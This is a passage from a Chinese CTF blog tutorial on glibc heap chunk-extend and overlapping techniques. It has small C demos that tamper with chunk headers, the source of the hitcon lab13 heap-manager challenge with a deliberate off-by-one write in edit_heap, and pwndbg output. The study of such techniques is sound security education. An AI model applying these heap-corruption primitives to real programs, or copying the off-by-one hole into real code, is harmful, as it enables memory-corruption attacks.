 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>释放之后的chunk1依然进入了unsort bin中。接下来 我们将断点下载第10行，需要注意的是此时更改size大小的操作是在free之后完成的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;=== size域被篡改</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span></span><br></pre></td></tr></table></figure>

<p>在修改完size之后重新申请0xa0的时候会从unsort bin中申请，这个时候大家需要总结一下，其实各个bin中存放的只有chunk的首地址，真正判断多大还得是去看这个chunk的size大小，所以再次申请的时候依然还可以对chunk2进行控制</p>
<h3 id="基本示例-4：通过-extend-后向-overlapping"><a href="#基本示例-4：通过-extend-后向-overlapping" class="headerlink" title="基本示例 4：通过 extend 后向 overlapping"></a>基本示例 4：通过 extend 后向 overlapping</h3><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g test4.c  -o test4</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *hollk, *hollk1;</span><br><span class="line">    hollk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x10 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)hollk - <span class="number">0x8</span>) = <span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(hollk);</span><br><span class="line">    hollk1 = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
<h3 id="基本示例-5：通过-extend-前向-overlapping"><a href="#基本示例-5：通过-extend-前向-overlapping" class="headerlink" title="基本示例 5：通过 extend 前向 overlapping"></a>基本示例 5：通过 extend 前向 overlapping</h3><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g test5.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *hollk1, *hollk2, *hollk3, *hollk4;</span><br><span class="line">    hollk1 = <span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    hollk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    hollk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    hollk4 = <span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(hollk1);</span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)hollk4 - <span class="number">0x8</span>) = <span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)hollk4 - <span class="number">0x10</span>) = <span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(hollk4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先布置好 5 个堆块，然后释放 ptr1 进入到 unsortedbin 。修改 ptr4 的 prev_inuse 为 0 标记前一个堆块释放（空闲）；修改 ptr4 的 prev_size 为 ptr1+ptr2+ptr3 。释放 ptr4 会触发回收机制，也就是合并物理相邻的堆，用到的操作是 unlink ，就将 ptr1~4 当做一个堆块放入 unsortedbin。<br>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>题目链接</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13</span><br></pre></td></tr></table></figure>

<h4 id="检查保护机制"><a href="#检查保护机制" class="headerlink" title="检查保护机制"></a>检查保护机制</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720162245306.png" alt="image-20230720162245306"></p>
<p>64位程序，开启了canary保护和NX保护，还有一点就是RELRO: Partial RELRO GOT表可以修改</p>
<h4 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h4><p>由于这道题给出了源码，所以分析时可以对照源码进行解读：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_input</span><span class="params">(<span class="type">char</span> *buf,<span class="type">size_t</span> size)</span>&#123;</span><br><span class="line">	<span class="type">int</span> ret ;</span><br><span class="line">    ret = read(<span class="number">0</span>,buf,size);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        _exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span> &#123;</span></span><br><span class="line">	<span class="type">size_t</span> size ;</span><br><span class="line">	<span class="type">char</span> *content ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span> *<span class="title">heaparray</span>[10];</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;          Heap Creator          &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 5. Exit                        &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_heap</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> i ;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	<span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!heaparray[i])&#123;</span><br><span class="line">			heaparray[i] = (<span class="keyword">struct</span> heap *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> heap));</span><br><span class="line">			<span class="keyword">if</span>(!heaparray[i])&#123;</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">			read(<span class="number">0</span>,buf,<span class="number">8</span>);</span><br><span class="line">			size = atoi(buf);</span><br><span class="line">			heaparray[i]-&gt;content = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">			<span class="keyword">if</span>(!heaparray[i]-&gt;content)&#123;</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			heaparray[i]-&gt;size = size ;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">			read_input(heaparray[i]-&gt;content,size);</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit_heap</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> idx ;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(heaparray[idx])&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">		read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+<span class="number">1</span>);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_heap</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> idx ;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(heaparray[idx])&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>,heaparray[idx]-&gt;size,heaparray[idx]-&gt;content);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_heap</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> idx ;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(heaparray[idx])&#123;</span><br><span class="line">		<span class="built_in">free</span>(heaparray[idx]-&gt;content);</span><br><span class="line">		<span class="built_in">free</span>(heaparray[idx]);</span><br><span class="line">		heaparray[idx] = <span class="literal">NULL</span> ;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);	</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">		<span class="keyword">switch</span>(atoi(buf))&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">				create_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">				edit_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line">				show_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line">				delete_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span> :</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">default</span> :</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720162734433.png" alt="image-20230720162734433"></p>
<h4 id="创建一个堆"><a href="#创建一个堆" class="headerlink" title="创建一个堆"></a>创建一个堆</h4><p>在程序中输入1以创建一个堆：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720162823355.png" alt="image-20230720162823355"></p>
<p>再创建一个堆：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720163129146.png" alt="image-20230720163129146"></p>
<h4 id="编辑一个堆"><a href="#编辑一个堆" class="headerlink" title="编辑一个堆"></a>编辑一个堆</h4><p>输入2执行此功能：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720163929221.png" alt="image-20230720163929221"></p>
<p>从上面的图可以看到，首先程序让我们输入堆的序列，根据这个序列来编辑对应的堆的内容。</p>
<p>（序列从0开始的）</p>
<h4 id="打印一个堆"><a href="#打印一个堆" class="headerlink" title="打印一个堆"></a>打印一个堆</h4><p>输入堆的序列以打印：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720164124086.png" alt="image-20230720164124086"></p>
<h4 id="删除一个堆"><a href="#删除一个堆" class="headerlink" title="删除一个堆"></a>删除一个堆</h4><p>输入堆的序列以删除。我们删除第二个堆</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720164254620.png" alt="image-20230720164254620"></p>
<p>并且用show查看一下堆已经被删除了。</p>
<p>可以看出，程序是一个堆管理器，有增删查改功能。</p>
<h4 id="分析struct结构体"><a href="#分析struct结构体" class="headerlink" title="分析struct结构体"></a>分析struct结构体</h4><p>每个content堆块用一个0x10的结构体去维护，结构体如下：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">chunk</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> size;		<span class="comment">//context 大小</span></span><br><span class="line">    _QWORD *chunk;		<span class="comment">//context 指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体代码就不分析了，主要看一下</p>
<h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tcnNreWUuY24tZ2QudWZpbGVvcy5jb20vaW1nLzIwMjAtMDgtMDItN1hvRDVrU0tXazlYQWFWYi5wbmc?x-oss-process=image/format,png" alt="img"></p>
<p>可以看到 19 行写入数据的时候传入的长度参数被故意加 1 了，造成溢出可控的一字节。</p>
<h4 id="pwngdb调试"><a href="#pwngdb调试" class="headerlink" title="pwngdb调试"></a>pwngdb调试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x18, </span><br><span class="line">  bk = 0x603030, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x603020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x6161616161616161, </span><br><span class="line">  fd_nextsize = 0xa, </span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x603040 FASTBIN &#123;</span><br><span class="line">  prev_size = 10, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x603060, </span><br><span class="line">  bk = 0x603070, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x603060 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x6363636363636363, </span><br><span class="line">  fd_nextsize = 0xa, </span><br><span class="line">  bk_nextsize = 0x20f81</span><br><span class="line">&#125;</span><br><span class="line">0x603080 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 10, </span><br><span class="line">  size = 135041, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x402000 r-xp     2000 0      </span><br><span class="line">          0x601000           0x602000 r--p     1000 1000   </span><br><span class="line">          0x602000           0x603000 rw-p     1000 2000   </span><br><span class="line">          0x603000           0x624000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdc000     0x7ffff7fdf000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span 